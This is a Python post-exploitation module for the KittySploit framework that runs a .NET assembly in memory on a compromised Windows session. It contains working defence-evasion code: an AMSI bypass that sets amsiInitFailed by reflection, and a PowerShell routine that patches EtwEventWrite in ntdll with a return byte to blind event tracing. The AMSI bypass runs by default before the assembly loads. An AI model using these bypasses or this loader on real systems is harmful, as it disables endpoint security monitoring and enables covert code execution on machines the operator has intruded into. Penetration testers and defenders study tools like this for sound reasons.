#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Run a .NET assembly in-memory on a Windows session (loadmodule)."""

from kittysploit import *

from lib.post.windows.assembly_loader import (
    is_dotnet_pe,
    list_assemblies,
    resolve_assembly,
)
from lib.post.windows.session import WindowsSessionMixin

_AMSI_INIT_FAILED = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
)

_ETW_PATCH_PS = r"""
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
}
"@
$nt = [EtwPatch]::GetModuleHandle("ntdll.dll")
$etw = [EtwPatch]::GetProcAddress($nt, "EtwEventWrite")
$old = 0
[EtwPatch]::VirtualProtect($etw, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etw, 0xC3)
Write-Output "ETW_PATCHED"
"""


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows LoadModule / Run Assembly",
        "description": (
            "Load a local or catalog .NET assembly (or a remote path) into memory "
            "via Assembly.Load and invoke Main. Small assemblies embed in one "
            "PowerShell call; larger ones stage briefly to %TEMP% then delete."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL, SessionType.POLLING],
        "references": [
            "https://attack.mitre.org/techniques/T1620/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.2,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    module = OptString(
        "",
        "Catalog name or local path for loadmodule. See list_assemblies",
        False,
    )
    local_path = OptString("", "Local .NET EXE/DLL on the operator machine", False)
    assembly_path = OptString("", "Remote path already on the target", False)
    type_name = OptString("", "Fully qualified type name (empty = auto-detect Main)", False)
    method_name = OptString("Main", "Static method to invoke", False)
    arguments = OptString("", "Arguments passed to Main (space-separated)", False)
    bypass_amsi = OptBool(True, "Attempt AMSI bypass before load", False)
    patch_etw = OptBool(False, "Patch ETW in current PS process before load", False)
    list_only = OptBool(False, "Only list data/assemblies catalog and exit", False)
    require_dotnet = OptBool(True, "Refuse non-.NET PE files when loading local bytes", False)

    def run(self):
        if bool(self.list_only):
            return self._list_catalog()

        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        local = str(self.local_path or "").strip()
        module_name = str(self.module or "").strip()
        remote = str(self.assembly_path or "").strip()
        type_name = str(self.type_name or "").strip()
        method_name = str(self.method_name or "Main").strip()
        arguments = str(self.arguments or "").strip()

        if self.bypass_amsi:
            self.win_run_powershell(_AMSI_INIT_FAILED, timeout=10)
        if self.patch_etw:
            self.win_run_powershell(_ETW_PATCH_PS, timeout=15)

        # Prefer local / catalog (true loadmodule)
        if local or module_name:
            name_or_path = local or module_name
            try:
                path, meta = resolve_assembly(name_or_path)
            except FileNotFoundError as exc:
                raise ProcedureError(FailureType.NotFound, str(exc)) from exc

            data = path.read_bytes()
            if self.require_dotnet and not is_dotnet_pe(data):
                raise ProcedureError(
                    FailureType.ConfigurationError,
                    f"Not a .NET assembly (no CLR header): {path}",
                )

            if not arguments and meta.get("default_args"):
                arguments = str(meta["default_args"])
            if not type_name and meta.get("type_name"):
                type_name = str(meta["type_name"])
            if method_name == "Main" and meta.get("method_name"):
                method_name = str(meta["method_name"] or "Main")

            print_status(
                f"loadmodule {meta.get('name') or path.name} "
                f"({len(data)} bytes) -> in-memory Assembly.Load"
            )
            out = self.win_run_dotnet_assembly_bytes(
                data,
                type_name=type_name,
                method_name=method_name,
                arguments=arguments,
            )
            return self._emit(out)

        if remote:
            if not self.win_remote_file_exists(remote):
                raise ProcedureError(FailureType.NotFound, f"Assembly not found on target: {remote}")
            print_status(f"Loading remote assembly in-memory: {remote}")
            out = self.win_run_dotnet_assembly(
                remote,
                type_name=type_name,
                method_name=method_name,
                arguments=arguments,
            )
            return self._emit(out)

        raise ProcedureError(
            FailureType.ConfigurationError,
            "Set module / local_path (loadmodule) or assembly_path (remote). "
            "Use list_only=true to show the catalog.",
        )

    def _emit(self, out: str) -> bool:
        if out:
            print_success("Assembly execution completed")
            print_info(out)
        else:
            print_warning("No output returned from assembly")
        return True

    def _list_catalog(self) -> bool:
        rows = list_assemblies()
        if not rows:
            print_warning("No assemblies in data/assemblies/ (add .exe/.dll + catalog.json)")
            return True
        print_status("Available assemblies (data/assemblies):")
        for entry in rows:
            mark = "OK" if entry.get("present") else "MISSING"
            desc = entry.get("description") or ""
            print_info(f"  [{mark}] {entry['name']}: {entry.get('file') or '?'}  {desc}")
        return True
